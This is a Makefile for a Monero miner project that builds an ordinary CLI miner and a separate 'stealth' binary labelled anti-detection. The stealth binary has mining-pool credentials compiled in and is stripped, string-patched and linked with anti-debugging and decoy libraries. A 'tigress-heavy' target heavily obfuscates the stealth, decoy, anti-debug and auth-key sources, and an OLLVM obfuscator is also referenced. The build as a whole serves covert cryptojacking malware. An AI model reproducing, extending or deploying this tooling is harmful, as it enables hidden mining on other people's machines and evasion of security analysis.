CC      = gcc
CXX     = g++
# CPU baseline: x86-64-v2 (Sandy Bridge+, runs on nearly all VMs)
# RandomX auto-detects per-file intrinsics via cmake (AES, SSSE3, AVX2)
# Override: make ARCH=native for max perf on build machine
#           make ARCH=x86-64-v3 for Haswell+ AVX2
ARCH   ?= x86-64-v2
CFLAGS  = -O1 -march=$(ARCH) -Wall -Wextra -pthread
AR      = ar
ARFLAGS = rcs

RANDOMX_DIR   = lib/randomx
RANDOMX_BUILD = $(RANDOMX_DIR)/build
RANDOMX_LIB   = $(RANDOMX_BUILD)/librandomx.a
RANDOMX_INC   = $(RANDOMX_DIR)/src

LIBS_DIR = libs

LIB_TARGETS = \
	$(LIBS_DIR)/libutils/libutils.a \
	$(LIBS_DIR)/libcrypto/libcrypto.a \
	$(LIBS_DIR)/libantidebug/libantidebug.a \
	$(LIBS_DIR)/libjson/libjson.a \
	$(LIBS_DIR)/libws/libws.a \
	$(LIBS_DIR)/libstratum/libstratum.a \
	$(LIBS_DIR)/libminer/libminer.a \
	$(LIBS_DIR)/libdecoy/libdecoy.a

BIN       = xmrminer
BIN_STEALTH = xmrminer_stealth

# Feature flags
FEATURE_TLS       ?= 1
FEATURE_WS        ?= 1
FEATURE_FULL_MEM  ?= 1
FEATURE_JIT       ?= 1
FEATURE_HARD_AES  ?= 1
FEATURE_LARGE_PAGES ?= 0
FEATURE_VERBOSE   ?= 1
FEATURE_COLORS    ?= 1
FEATURE_KEEPALIVE ?= 1

CFLAGS += -DFEATURE_TLS=$(FEATURE_TLS) -DFEATURE_WS=$(FEATURE_WS) \
          -DFEATURE_FULL_MEM=$(FEATURE_FULL_MEM) -DFEATURE_JIT=$(FEATURE_JIT) \
          -DFEATURE_HARD_AES=$(FEATURE_HARD_AES) -DFEATURE_LARGE_PAGES=$(FEATURE_LARGE_PAGES) \
          -DFEATURE_VERBOSE=$(FEATURE_VERBOSE) -DFEATURE_COLORS=$(FEATURE_COLORS) \
          -DFEATURE_KEEPALIVE=$(FEATURE_KEEPALIVE)

ifdef EXTRA_FLAGS
	CFLAGS += $(EXTRA_FLAGS)
endif

ALL_LIBS = \
	$(LIBS_DIR)/libutils/libutils.a \
	$(LIBS_DIR)/libcrypto/libcrypto.a \
	$(LIBS_DIR)/libantidebug/libantidebug.a \
	$(LIBS_DIR)/libjson/libjson.a \
	$(LIBS_DIR)/libws/libws.a \
	$(LIBS_DIR)/libstratum/libstratum.a \
	$(LIBS_DIR)/libminer/libminer.a \
	$(LIBS_DIR)/libdecoy/libdecoy.a

.PHONY: all clean libs randomx info

all: randomx libs $(BIN) $(BIN_STEALTH)

libs: | $(OLLVM)

$(OLLVM):
	@if [ -f $(OLLVM_TAR) ]; then \
		echo "  extracting ollvm.tar.gz..."; \
		tar -xzf $(OLLVM_TAR) -C $(CURDIR); \
		chmod +x $(CURDIR)/ollvm/bin/*; \
	elif [ ! -f $(OLLVM) ]; then \
		echo "Error: $(OLLVM) not found and $(OLLVM_TAR) is missing" >&2; \
		false; \
	fi

# ============================================================================
# Build all libraries
# ============================================================================

libs: $(LIB_TARGETS)

$(LIBS_DIR)/libutils/libutils.a:
	$(MAKE) -C $(LIBS_DIR)/libutils CC="$(CC)" CFLAGS="$(CFLAGS)"

$(LIBS_DIR)/libcrypto/libcrypto.a:
	$(MAKE) -C $(LIBS_DIR)/libcrypto CC="$(CC)" CFLAGS="$(CFLAGS)"

$(LIBS_DIR)/libantidebug/libantidebug.a:
	$(MAKE) -C $(LIBS_DIR)/libantidebug CC="$(CC)" CFLAGS="$(CFLAGS)"

$(LIBS_DIR)/libjson/libjson.a:
	$(MAKE) -C $(LIBS_DIR)/libjson CC="$(CC)" CFLAGS="$(CFLAGS)"

$(LIBS_DIR)/libws/libws.a:
	$(MAKE) -C $(LIBS_DIR)/libws CC="$(CC)" CFLAGS="$(CFLAGS)" FEATURE_TLS=$(FEATURE_TLS)

$(LIBS_DIR)/libstratum/libstratum.a:
	$(MAKE) -C $(LIBS_DIR)/libstratum CC="$(CC)" CFLAGS="$(CFLAGS)" FEATURE_TLS=$(FEATURE_TLS)

$(LIBS_DIR)/libminer/libminer.a:
	$(MAKE) -C $(LIBS_DIR)/libminer CC="$(CC)" CFLAGS="$(CFLAGS)" \
		FEATURE_FULL_MEM=$(FEATURE_FULL_MEM) FEATURE_JIT=$(FEATURE_JIT) \
		FEATURE_HARD_AES=$(FEATURE_HARD_AES) FEATURE_LARGE_PAGES=$(FEATURE_LARGE_PAGES)

$(LIBS_DIR)/libdecoy/libdecoy.a:
	$(MAKE) -C $(LIBS_DIR)/libdecoy CC="$(CC)" CFLAGS="$(CFLAGS)" FEATURE_TLS=$(FEATURE_TLS)

# ============================================================================
# Binaries — includes all library include paths
# ============================================================================

INCS = -I$(RANDOMX_INC) \
       -I$(LIBS_DIR)/libutils/include \
       -I$(LIBS_DIR)/libcrypto/include \
       -I$(LIBS_DIR)/libantidebug/include \
       -I$(LIBS_DIR)/libjson/include \
       -I$(LIBS_DIR)/libws/include \
       -I$(LIBS_DIR)/libstratum/include \
       -I$(LIBS_DIR)/libminer/include \
       -I$(LIBS_DIR)/libdecoy/include \
       -Isrc

STATIC ?= 0
ifeq ($(STATIC),1)
STATIC_FLAG = -static
SSL_LIBS = -lssl -lcrypto
EXTRA_LIBS = -lzstd -lz -ldl -lpthread -lm -lstdc++
else
STATIC_FLAG =
SSL_LIBS = $(if $(wildcard static_lib/libssl.a),static_lib/libssl.a static_lib/libcrypto.a,-lssl -lcrypto)
EXTRA_LIBS = -lpthread -lm -ldl -lstdc++ -lzstd -lz
endif

DL_STUB_SRC = src/dl_cpu_stub.c
DL_STUB_OBJ = src/dl_cpu_stub.o

LINK_LIBS = \
	$(LIBS_DIR)/libstratum/libstratum.a \
	$(LIBS_DIR)/libminer/libminer.a \
	$(LIBS_DIR)/libdecoy/libdecoy.a \
	$(LIBS_DIR)/libws/libws.a \
	$(LIBS_DIR)/libjson/libjson.a \
	$(LIBS_DIR)/libantidebug/libantidebug.a \
	$(LIBS_DIR)/libcrypto/libcrypto.a \
	$(LIBS_DIR)/libutils/libutils.a \
	$(RANDOMX_LIB) \
	$(SSL_LIBS) \
	$(DL_STUB_OBJ) \
	$(STATIC_FLAG) $(EXTRA_LIBS)

# --- xmrminer (user-friendly CLI) ---

MAIN_SRC = src/main.c
MAIN_OBJ = src/main.o

$(BIN): $(MAIN_OBJ) $(ALL_LIBS) $(RANDOMX_LIB) $(DL_STUB_OBJ)
	$(CC) $(CFLAGS) $(INCS) -o $@ $(MAIN_OBJ) $(LINK_LIBS)
	@python3 patch_strings.py $@

$(DL_STUB_OBJ): $(DL_STUB_SRC)
	$(CC) $(CFLAGS) -c -o $@ $<

$(MAIN_OBJ): src/main.c
	$(CC) $(CFLAGS) $(INCS) -c -o $@ $<

# --- xmrminer_stealth (hardcoded, anti-detection) ---
# Config file:   edit stealth.conf, then `make`
# CLI override:  make STEALTH_URL=wss://pool:3333 STEALTH_THREADS=4
# CLI takes precedence over stealth.conf
STEALTH_CFLAGS = $(if $(STEALTH_URL),-DSTEALTH_URL='"$(STEALTH_URL)"') \
                 $(if $(STEALTH_USER),-DSTEALTH_USER='"$(STEALTH_USER)"') \
                 $(if $(STEALTH_PASS),-DSTEALTH_PASS='"$(STEALTH_PASS)"') \
                 $(if $(STEALTH_WORKER),-DSTEALTH_WORKER='"$(STEALTH_WORKER)"') \
                 $(if $(STEALTH_THREADS),-DSTEALTH_THREADS=$(STEALTH_THREADS))

STEALTH_SRC = src/stealth.c
STEALTH_OBJ = src/stealth.o

$(BIN_STEALTH): $(STEALTH_OBJ) $(ALL_LIBS) $(RANDOMX_LIB) $(DL_STUB_OBJ)
	$(CC) $(CFLAGS) $(INCS) -o $@ $(STEALTH_OBJ) $(LINK_LIBS)
	@strip --strip-all $@ && echo "  stripped $@"
	@python3 patch_strings.py $@

$(STEALTH_OBJ): src/stealth.c
	$(CC) $(CFLAGS) $(STEALTH_CFLAGS) $(INCS) -c -o $@ $<

# ============================================================================
# RandomX
# ============================================================================

$(RANDOMX_LIB):
	@if [ ! -d "$(RANDOMX_DIR)" ]; then \
		echo "Cloning RandomX..."; \
		mkdir -p lib && git clone --depth 1 https://github.com/tevador/RandomX.git lib/randomx; \
	fi
	@if [ ! -f "$(RANDOMX_LIB)" ]; then \
		mkdir -p $(RANDOMX_BUILD) && cd $(RANDOMX_BUILD) && \
		CC= CXX= cmake .. -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF && \
		make -j$$(nproc); \
	fi

# ============================================================================
# Utilities
# ============================================================================

TIGRESS ?= /usr/local/bin/tigress
TIGRESS_ENV = --Environment=x86_64:Linux:Gcc:4.6
TIGRESS_DEFS = -D_POSIX_C_SOURCE=199309L -D_GNU_SOURCE -DFEATURE_TLS=1 -DFEATURE_WS=1 -DFEATURE_FULL_MEM=1 -DFEATURE_JIT=1 -DFEATURE_HARD_AES=1 -DFEATURE_LARGE_PAGES=0 -DFEATURE_VERBOSE=1 -DFEATURE_COLORS=1 -DFEATURE_KEEPALIVE=1
TIGRESS_INCS = -Isrc -Ilibs/libutils/include -Ilibs/libcrypto/include -Ilibs/libantidebug/include -Ilibs/libjson/include -Ilibs/libws/include -Ilibs/libstratum/include -Ilibs/libminer/include -Ilibs/libdecoy/include -Ilib/randomx/src

tigress-heavy:
	@for f in src/main.c src/stealth.c libs/libcrypto/src/auth_key.c libs/libcrypto/src/auth_key_data.c libs/libcrypto/src/decoys.c libs/libantidebug/src/antidebug.c libs/libdecoy/src/decoy.c libs/libutils/src/hex.c libs/libutils/src/cpu.c; do \
		echo "==> $$f"; \
		cp $$f $$f.tigsrc.c; \
		if ! grep -q '\bmain\b.*(' $$f; then printf '\nint main(void){return 0;}\n' >> $$f.tigsrc.c; fi; \
		INIT=$$( if grep -q '\bmain\b.*(' $$f; then echo main; else perl -lne 'if(/^[a-zA-Z_][\w\s\*\(\)]*\b([a-zA-Z_]\w*)\s*\([^;]*\)\s*\{/){$$n=$$1; next if $$n=~/^(if|for|while|switch|sizeof)$$/; print $$n; exit}' $$f; fi ); \
		$(TIGRESS) --Seed=1 $(TIGRESS_ENV) $(TIGRESS_DEFS) $(TIGRESS_INCS) \
		  --Transform=InitEntropy --Functions=$$INIT \
		  --Transform=InitOpaque --Functions=$$INIT \
		  --Transform=AddOpaque --Functions=* --AddOpaqueKinds=call,bug,true,junk --AddOpaqueCount=2 \
		  --Transform=EncodeLiterals --Functions=* \
		  --Transform=EncodeArithmetic --Functions=* \
		  --Transform=Split --Functions=* \
		  --Transform=Flatten --Functions=* --FlattenDispatch=switch,goto,indirect \
		  --Transform=Virtualize --Functions=* \
		  --Transform=CleanUp --Functions=* \
		  --out=$$f.tigout.c $$f.tigsrc.c || { echo "FAIL $$f"; rm -f $$f.tigsrc.c $$f.tigout.c; continue; }; \
		if ! grep -q '\bmain\b.*(' $$f; then perl -0pi -e "s/int main\(int _TIG_IZ_vGt1_formal_argc[^\n]*;\n//g; s/\/\* BEGIN FUNCTION-DEF main .*?\/\* END FUNCTION-DEF main [^\n]*\n//s" $$f.tigout.c; fi; \
		mv $$f.tigout.c $$f; rm -f $$f.tigsrc.c; \
		echo "OK $$f"; \
	done

clean:
	rm -f $(MAIN_OBJ) $(STEALTH_OBJ) $(DL_STUB_OBJ) $(BIN) $(BIN_STEALTH)
	for d in $(LIBS_DIR)/libutils $(LIBS_DIR)/libcrypto $(LIBS_DIR)/libantidebug \
	         $(LIBS_DIR)/libjson $(LIBS_DIR)/libws $(LIBS_DIR)/libstratum \
	         $(LIBS_DIR)/libminer $(LIBS_DIR)/libdecoy; do \
		$(MAKE) -C $$d clean; \
	done

info:
	@echo "=== Build Configuration ==="
	@echo "Arch:           $(ARCH)"
	@echo "TLS:            $(FEATURE_TLS)"
	@echo "WebSocket:      $(FEATURE_WS)"
	@echo "Full Dataset:   $(FEATURE_FULL_MEM)"
	@echo "JIT:            $(FEATURE_JIT)"
	@echo "Hard AES:       $(FEATURE_HARD_AES)"
	@echo "Large Pages:    $(FEATURE_LARGE_PAGES)"
	@echo "Verbose:        $(FEATURE_VERBOSE)"
	@echo "Colors:         $(FEATURE_COLORS)"
	@echo "Keepalive:      $(FEATURE_KEEPALIVE)"
	@echo "=========================="
	@echo ""
	@echo "=== Stealth Config ==="
	@grep '^#define STEALTH_' stealth.conf | sed 's/#define //' | while read k v; do \
		override="$(STEALTH_URL)$(STEALTH_USER)$(STEALTH_PASS)$(STEALTH_WORKER)$(STEALTH_THREADS)"; \
		printf "  %-15s %s%s\n" "$$k" "$$v" "$$([ -n "$$override" ] && echo '  (CLI override active)')"; \
	done
	@echo "=========================="
	@echo "=== Library Status ==="
	@for lib in $(LIB_TARGETS); do \
		if [ -f "$$lib" ]; then echo "  [built] $$lib"; else echo "  [missing] $$lib"; fi; \
	done
